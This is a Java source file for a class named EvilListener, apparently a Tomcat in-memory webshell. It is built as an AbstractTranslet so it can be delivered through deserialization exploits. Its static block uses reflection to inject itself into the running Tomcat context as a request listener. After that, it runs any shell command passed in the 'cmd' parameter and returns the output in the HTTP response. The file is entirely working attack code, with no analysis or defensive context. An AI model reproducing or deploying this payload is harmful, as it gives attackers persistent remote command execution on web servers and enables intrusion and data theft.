package com.exp;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

public class EvilListener extends AbstractTranslet implements ServletRequestListener {
    static {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        try {
            Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
            field.setAccessible(true);
            WebResourceRoot resources = (WebResourceRoot) field.get(webappClassLoaderBase);
            StandardContext standardContext = (StandardContext) resources.getContext();

            EvilListener listener = new EvilListener();
            standardContext.addApplicationEventListener(listener);

            System.out.println("Inject success");
        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
//        ServletRequestListener.super.requestDestroyed(sre);
        System.out.println("Evil requestDestroyed");
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        try {
            Field field = req.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request request = (Request) field.get(req);
            Response response = request.getResponse();

            if (req.getParameter("cmd") != null) {
                String cmd = req.getParameter("cmd");
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                PrintWriter out = response.getWriter();
                out.println(output);
                out.flush();
                out.close();
            }
        } catch (NoSuchFieldException | IOException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
    }
}
